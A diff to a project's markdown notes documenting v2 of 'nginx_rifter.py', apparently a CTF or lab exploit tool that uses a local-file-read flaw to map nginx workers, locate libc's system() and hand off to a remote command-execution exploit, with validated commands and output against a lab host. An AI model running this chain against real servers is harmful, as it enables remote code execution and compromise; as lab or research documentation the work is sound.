@@ -367,6 +367,56 @@ run artifact: artifacts/demo_v1_9_20260515-060834.json
 
 Status: pass.
 
+## nginx_rifter v2 Changes
+
+`nginx_rifter.py` is the v2 assessment-first entry point.
+
+- Default behavior is assessment only; it does not run the crashing exploit path.
+- Profiles the local-file-read primitive for text reads, binary reads, ranged reads, `/proc/self/status`, and `/proc/self/maps`.
+- Fingerprints OS, kernel, nginx, libc, build IDs, hashes, and libc package version when readable.
+- Discovers nginx worker maps and derives libc `system()` when the file-read permissions allow it.
+- Discovers nginx config paths from master cmdline plus common paths and detects vulnerable `rewrite` + `set` candidates.
+- Produces a viability matrix for the current core-guided chain.
+- Keeps exploit execution behind explicit `--exploit --cmd ...`, handing off to `demo_ctf_exploit_v1_9.py`.
+
+Validated assessment:
+
+```bash
+./nginx_rifter.py --target 192.168.1.205:19321 \
+  --artifact-dir artifacts --no-color \
+  --output artifacts/nginx_rifter_20260515-v2-final.json
+```
+
+Observed result:
+
+```text
+HTTP/2 cleartext: yes
+ranged reads: True
+worker maps: readable
+system(): 0x7fca47abdd70
+rewrite/set candidates: 1
+verdict: ready-with-lab-like-core-leak
+```
+
+Validated custom file-read template:
+
+```bash
+./nginx_rifter.py --target 192.168.1.205:19321 \
+  --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}' \
+  --artifact-dir artifacts --no-color \
+  --output artifacts/nginx_rifter_20260515-v2-template.json
+```
+
+Validated explicit exploit handoff:
+
+```bash
+./nginx_rifter.py --target 192.168.1.205:19321 \
+  --artifact-dir artifacts --no-color \
+  --exploit --cmd id --fast --exploit-rounds 1 --phpinfo-path ''
+```
+
+Status: pass.
+
 ## Recommended Demo Command
 
 For video recording:
